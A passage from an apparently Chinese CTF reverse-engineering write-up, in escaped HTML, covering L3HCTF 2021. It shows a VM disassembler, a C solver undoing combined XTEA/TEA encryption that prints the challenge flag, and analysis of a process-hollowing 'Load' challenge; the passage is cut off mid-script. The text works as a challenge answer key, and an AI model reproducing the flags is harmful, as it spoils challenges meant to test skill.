style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# i = int.from_bytes(opcode[i + 1: i + 5], &amp;#39;little&amp;#39;, signed=False) + i + 5&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i += 5 + (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; if memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] != 0 else 0)&amp;#34;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index += &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;%04x i += 5&amp;#34; % i)&lt;/span&gt;
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;return (memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;])&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error @ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;动调发现，总共有两个vm，flag的内存被共享，其他的状态分别保留，两个vm依次执行（能看到中间某个循环末尾有个return）分别是xtea加密和tea加密，相当于同时进行xtea和tea加密了写个求解脚本&lt;/p&gt;
&lt;p&gt;需要注意是程序中为int类型，运算需要和题目中的一致（不能用位运算）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;     &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decipher&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; xtea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;18764&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;28534&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25888&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17237&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v0, v1, xtea_delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123456789&lt;/span&gt;, xtea_sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;987654321&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; xtea_delta &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;21332&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20301&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8308&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25953&lt;/span&gt;};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tea_delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22334455&lt;/span&gt;;                     &lt;span style=&#34;color:#75715e&#34;&gt;/* a key schedule constant */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tea_sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1592647341&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_delta &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;/* set up */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;){
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[j]; v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
            v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tea_k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
            tea_sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; tea_delta;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
                v0 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1010101&lt;/span&gt;;
                v1 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1010101&lt;/span&gt;;
            }
            v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; (((v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (xtea_sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; xtea_k[(xtea_sum &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
            xtea_sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; xtea_delta;
            v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; (((v1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; ) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (xtea_sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; xtea_k[xtea_sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
                v0 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1010101&lt;/span&gt;;
                v1 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1010101&lt;/span&gt;;
            }
        }                                              &lt;span style=&#34;color:#75715e&#34;&gt;/* end cycle */&lt;/span&gt;
        v[j]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0xAEE0FAE8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC3E4101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x167CAD92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51EA6CBE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x242A0100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1511A1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x514D6694&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F5FBFEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46D36398&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79EEE3F0&lt;/span&gt;};
    decipher(v);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x %x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,v[i],v[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;span style=&#34;color:#75715e&#34;&gt;// [0x6c427530, 0x4d765f65, 0x7431575f, 0x4f645f68, 0x65496275, 0x4145545f, 0x7d] 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// L3HCTF{D0uBle_vM_W1th_dOubIe_TEA} // 第一组失败了，猜测是flag头和D
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;l3hctf-2021load&#34;&gt;[L3HCTF 2021]Load&lt;/h2&gt;
&lt;p&gt;这题使用了进程镂空技术（找时间研究室一下这一系列的技术），需要先把PE文件提取出来&lt;/p&gt;
&lt;p&gt;动调进入镂空的函数，会发现一个对PE的比较，网上找可以找到MZ头（name字符串下面），dump下来即可&lt;/p&gt;
&lt;p&gt;分析PE&lt;/p&gt;
&lt;p&gt;首先提取了flag的中间部分，随后将其两两一组转化成16进制，共13字节&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 323; 
			flex-basis: 777px&#34;
	&gt;
	&lt;a href=&#34;/post/resent-re-challenge/1.png&#34; data-size=&#34;340x105&#34;&gt;
		&lt;img src=&#34;/post/resent-re-challenge/1.png&#34;
			width=&#34;340&#34;
			height=&#34;105&#34;
			srcset=&#34;/post/resent-re-challenge/1_hu7d51f8c69498d6f4f5709129f232c79f_6720_480x0_resize_box_3.png 480w, /post/resent-re-challenge/1_hu7d51f8c69498d6f4f5709129f232c79f_6720_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;401070函数是将13字节拆成9和4字节分别存入src和v27，分别是3&lt;em&gt;3和2&lt;/em&gt;2的矩阵&lt;/p&gt;
&lt;p&gt;401370函数较大，且调用了一个递归函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;      v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mul_matrix_4012A0(v17, v6) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[v5];
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; v11;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v11;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析发现函数计算递归后与第一行的一个数字相乘，并根据奇偶进行加法和减法，重写该函数并验证后发现是求解矩阵行列式&lt;/p&gt;
&lt;p&gt;再分析401370函数时发现，函数使用了一个数字除以行列式，猜测是用来求解逆矩阵的&lt;/p&gt;
&lt;p&gt;调用完401370后就是验证部分，只需要满足所有等式即可&lt;/p&gt;
&lt;p&gt;使用在线网站求解逆矩阵&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 124; 
			flex-basis: 298px&#34;
	&gt;
	&lt;a href=&#34;/post/resent-re-challenge/2.png&#34; data-size=&#34;291x234&#34;&gt;
		&lt;img src=&#34;/post/resent-re-challenge/2.png&#34;
			width=&#34;291&#34;
			height=&#34;234&#34;
			srcset=&#34;/post/resent-re-challenge/2_hu23766dfba6579240b31c24b90a4ff4be_5630_480x0_resize_box_3.png 480w, /post/resent-re-challenge/2_hu23766dfba6579240b31c24b90a4ff4be_5630_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 108; 
			flex-basis: 261px&#34;
	&gt;
	&lt;a href=&#34;/post/resent-re-challenge/3.png&#34; data-size=&#34;211x194&#34;&gt;
		&lt;img src=&#34;/post/resent-re-challenge/3.png&#34;
			width=&#34;211&#34;
			height=&#34;194&#34;
			srcset=&#34;/post/resent-re-challenge/3_hu3c1ceed2bdba8d712cb5279da6c96ed5_3132_480x0_resize_box_3.png 480w, /post/resent-re-challenge/3_hu3c1ceed2bdba8d712cb5279da6c96ed5_3132_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
